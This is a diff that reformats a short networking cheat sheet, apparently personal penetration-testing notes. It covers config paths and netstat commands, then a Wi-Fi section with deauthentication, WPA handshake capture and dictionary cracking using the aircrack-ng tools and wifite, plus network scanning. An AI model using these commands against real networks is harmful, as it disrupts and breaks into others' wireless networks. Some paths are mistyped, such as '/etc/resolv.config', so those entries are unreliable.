@@ -1,48 +1,48 @@
-#############
+
 # NETWORKING
-#############
 
+**Proxychains config**
+/etc/proxychains4.conf
 
-------
-/etc/proxychains4.conf			# proxychains config
-/etc/dhcp/dhclient.comf			# dns manual config
-/etc/resolv.conf			# dns network config
+**DNS manual config**
+/etc/dhcp/dhclient.comf
 
+**DNS network config**
+/etc/resolv.config
 
-------
-# netstat
+**Netstat**
 netstat -natu | grep 'ESTABLISHED'
 netstat -natu | grep 'LISTENING'
 
-
-------
+**Systemctl**
 systemctl start/restart networking
 systemctl stop networking
 systemctl status networking
 
-
-------
+**Interface**
 ip link set <interface> up/down
 
-
-------
-# HANDSHAKE
+**HANDSHAKE**
 ipconfig/iwconfig
 airmon-ng start (wlan0)
-airodump-ng (wan0mon)	# note bssid, station, channel, beacon	
+
+**Note bssid, station, channel, beacon**
+airodump-ng (wan0mon)
 airodump-ng -c (channel) --bssid (BSSID) -w (write file) (wlan0mon)
-# kick off network to capture 4-way handshake
+
+**Kick off network to capture 4-way handshake**
 aireplay-ng --deauth 0 -a (bssid) -c (station) wlan0mon
-# View capture.cap file in Wireshark (eapol filter)
+
+**View capture.cap file in Wireshark (eapol filter)**
 aircrack-ng capture.cap -w (wordlist.txt)
 
-
-------
+**Wifite**
 sudo wifite --wpa --dict (file.txt) --kill
 
+**Discover devices in the network**
+netdiscover -r 192.168.0.0/24
 
-------
-netdiscover -r 192.168.0.0/24		# discover devices in the network
-nmap 192.168.1.0			# use nmap on target ip
-# use browser to navigate http site
+**Use nmap on target ip**
+nmap 192.168.1.0
 
+**Use browser to navigate http site**
